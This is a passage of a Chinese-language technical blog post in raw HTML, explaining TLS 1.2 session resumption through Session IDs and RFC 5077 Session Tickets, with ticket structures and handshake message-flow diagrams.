src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/tls-poison/Part1-1/2.jpeg" alt=""></p><p>客户端首先发送了一个 Client Hello 消息给服务端，并且其 Session ID 为空，这时候 Server 响应了 Server Hello 当中就会返回一个 32 字节长度的 Session ID。现在客户端和服务器的 TLS 会话缓存中都存储了 Session ID，其值为 56bcf9f6ea40ac1bbf05ff7fd209d423da9f96404103226c7f927ad7a2992433。这样做的好处就是，在下一次TLS连接请求中，客户端不需要再经历完整的TLS握手。</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/tls-poison/Part1-1/3.jpeg" alt=""></p><p>客户端只需在其 Client Hello 消息中发送之前从 Server 那里得知的 Session ID ，然后 Server 确认这个 Session ID 在它的 TLS 会话缓存之后，它们就会进行所谓的 Abbreviated TLS Handshake 。在这次 TLS 握手过程中不会交换证书或密钥信息，之前协商好的密钥会被重新使用，这样就完成了一次 TLS Session Resumption 。</p><h4 id="TLS-1-2-Session-Resumption-Session-Ticket"><a href="#TLS-1-2-Session-Resumption-Session-Ticket" class="headerlink" title="TLS 1.2 Session Resumption - Session Ticket"></a>TLS 1.2 Session Resumption - Session Ticket</h4><p>然而，Session ID 机制的一个实际限制是要求服务器为每个客户端创建和维护一个会话缓存。这就导致了服务器上的几个问题，每天可能会有成千上万甚至上百万个独特的连接；每一个打开的TLS连接都会消耗内存，需要 Session ID 缓存和删除策略，以及对于有许多服务器的热门网站的部署挑战，理想情况下，这些网站应该使用共享的 TLS Session 缓存以获得最佳性能。因此，对于任何多服务器的部署，Session ID 都需要一些仔细的思考和系统架构，以确保会话缓存的良好运行。</p><p>为了解决服务器端部署 TLS 会话缓存的这一问题，引入了 Session Ticket (RFC 5077)替换机制，它取消了服务器保留每个客户端会话状态的要求。取而代之的是，如果客户端表示支持会话票，服务器可以包含一个会话票记录，其中包括所有用只有服务器知道的秘密密钥加密的协商会话数据。然后，该会话票由客户端存储，并且可以包含在后续会话的握手消息中。因此，所有的会话数据只存储在客户端，但票据仍然是安全的，因为它是用只有服务器知道的密钥加密的。</p><p>会话票机制被称为无状态恢复机制。无状态恢复机制的主要改进是取消了服务器端的会话缓存，简化了部署，要求客户端在每次与服务器的新连接时提供会话票据，直到票据过期。</p><p>TLS SessionTicket 是一个扩展，其基于 <a href="https://tools.ietf.org/html/rfc4366" target="_blank" rel="noopener">RFC4366</a> 。Ticket 的格式是一个 opaque 的结构，用于携带特定会话的状态信息。RFC 推荐的 Session Ticket 结构如下：</p><p></p><figure class="highlight angelscript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">struct {</span><br><span class="line">  <span class="hljs-built_in">uint</span>32 ticket_lifetime_hint;</span><br><span class="line">  opaque ticket&lt;<span class="hljs-number">0.</span><span class="hljs-number">.2</span>^<span class="hljs-number">16</span><span class="hljs-number">-1</span>&gt;;</span><br><span class="line">} NewSessionTicket;</span><br><span class="line"></span><br><span class="line">struct {</span><br><span class="line">  opaque key_name[<span class="hljs-number">16</span>];</span><br><span class="line">  opaque iv[<span class="hljs-number">16</span>];</span><br><span class="line">  opaque encrypted_state&lt;<span class="hljs-number">0.</span><span class="hljs-number">.2</span>^<span class="hljs-number">16</span><span class="hljs-number">-1</span>&gt;;</span><br><span class="line">  opaque mac[<span class="hljs-number">32</span>];</span><br><span class="line">} ticket;</span><br></pre></td></tr></tbody></table></figure><p></p><p>这个扩展可以在 ClientHello 和 ServerHello 中发送。如果客户端拥有一个想要用来恢复会话的 ticket，那么它就会在 ClientHello 中的 SessionTicket 扩展中包含这个 ticket。如果客户端没有票据，并且准备在 NewSessionTicket 握手消息中接收票据，那么它必须在 SessionTicket 扩展中包含一个长度为零的 Session Ticket 。如果客户端不准备在 NewSessionTicket 握手消息中接收票据，则必须不包含 SessionTicket 扩展，除非客户端发送通过其他方式从服务器收到的非空票据。</p><p></p><figure class="highlight routeros hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">     <span class="hljs-built_in"> Client </span>                                              Server</span><br><span class="line"></span><br><span class="line">      ClientHello</span><br><span class="line">     (empty SessionTicket extension)--------&gt;</span><br><span class="line">                                                      ServerHello</span><br><span class="line">                                  (empty SessionTicket extension)</span><br><span class="line">                                                     Certificate*</span><br><span class="line">                                               ServerKeyExchange*</span><br><span class="line">                                              CertificateRequest*</span><br><span class="line">                                   &lt;--------      ServerHelloDone</span><br><span class="line">      Certificate*</span><br><span class="line">      ClientKeyExchange</span><br><span class="line">      CertificateVerify*</span><br><span class="line">      [ChangeCipherSpec]</span><br><span class="line">      Finished                     --------&gt;</span><br><span class="line">                                                 NewSessionTicket</span><br><span class="line">                                               [ChangeCipherSpec]</span><br><span class="line">                                   &lt;--------             Finished</span><br><span class="line">      Application Data             &lt;-------&gt;     Application Data</span><br><span class="line"></span><br><span class="line">Figure 1: Message Flow <span class="hljs-keyword">for</span> Full Handshake Issuing New Session Ticket</span><br></pre></td></tr></tbody></table></figure><p></p><p>如上流程图所示，客户端通过在 ClientHello 消息中包含一个 SessionTicket TLS 扩展名来表示它支持这种机制，此时 SessionTicket 为空，服务器将发送一个空的SessionTicket 扩展来表示它将使用 NewSessionTicket 握手消息发送一个新的 Session Ticket，该消息是在服务器成功验证客户端的 Finished 消息后，在ChangeCipherSpec 消息之前的 TLS 握手期间发送。在得到 Session Ticket 后，Client 将该 Session Ticket 与主密和其他与当前会话相关的参数一起缓存。</p><p></p><figure class="highlight routeros hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">    <span class="hljs-built_in"> Client </span>                                               Server</span><br><span class="line">     ClientHello</span><br><span class="line">     (SessionTicket extension)      --------&gt;</span><br><span class="line">                                                      ServerHello</span><br><span class="line">                                  (empty SessionTicket extension)</span><br><span class="line">                                                 NewSessionTicket</span><br><span class="line">                                               [ChangeCipherSpec]</span><br><span class="line">                                   &lt;--------             Finished</span><br><span class="line">     [ChangeCipherSpec]</span><br><span class="line">     Finished                      --------&gt;</span><br><span class="line">     Application Data              &lt;-------&gt;     Application Data</span><br><span class="line"></span><br><span class="line">Figure 2: Message Flow <span class="hljs-keyword">for</span> Abbreviated Handshake Using New Session</span><br><span class="line">                              Ticket</span><br></pre></td></tr></tbody></table></figure><p></p><p>当客户端希望恢复会话时，它在 ClientHello 消息中的 SessionTicket 扩展中包含该票据。然后服务器对收到的票据进行解密，验证票据的有效性，从票据的内容中检索会话状态，并使用这个状态来恢复会话。如果服务器成功验证了客户端的票据，那么就可以在 ServerHello 之后加入 NewSessionTicket 握手消息来续订票据。</p><p>我们可以通过实例来进一步了解这个机制：</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/tls-poison/Part1-1/4.jpeg" alt=""></p><p>客户端首先通过在 Client Hello 消息中添加 SessionTickets TLS Extension 来表明它支持无状态会话恢复（绿色部分）， Server 还会通过发送包含有空的 SessionTicket TLS Extension 的 Server Hello 消息给 Client ，表示 Server 支持 SessionTicket TLS Extension（红色部分）。</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/tls-poison/Part1-1/5.jpeg" alt=""></p><p>在握手完成之前，也就是 Finished 之前，Server 会发送一个名为 New Session Ticket 的新 TLS 消息，其中包含加密的会话信息（如主密、使用的密码等），Server 可以在稍后使用它专门为此生成的唯一密钥进行解密。从这一点开始，Client 会将 Session Ticket 保存在它的 TLS 缓存中，直到下一次它在 Session Ticket过期之前都可以使用它与之前的 Server 恢复 TLS 会话。</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/tls-poison/Part1-1/6.jpeg" alt=""></p><p>现在，当 Client 想要重新使用之前的会话时，它在 Client Hello 消息的 SessionTicket TLS Extension 中发送了 Session Ticket，此时我们所注意到，客户端也创建了一个新的会话 ID ，用于以下目的：</p><ul><li>服务器回复相同的 Session ID 表示 Server 接受 Session Ticket ，并将重用该 Session 。</li><li>服务器回复空的/不同的 Session ID ：Server 决定进行完全握手，原因是可能是 Session Ticket 过期了，或者它正在恢复原来的会话。<br>PS：这样的 Session ID 并不存储在 Server 上，否则会破坏无状态会话重用的目的。这是一次性使用，只是为了向 Client 表示 Server 接受了他们发送的session ticket。</li></ul><p>在上述的例子中，Server 成功接受并重用了 TLS 会话，我们可以确认进行了一个 Abbreviated TLS 握手，并且在服务器的 Server Hello 消息中，Server 回复了客户端发送的相同 Session ID 。这就是一个简单的基于 Session Ticket 机制的 Session Resumption 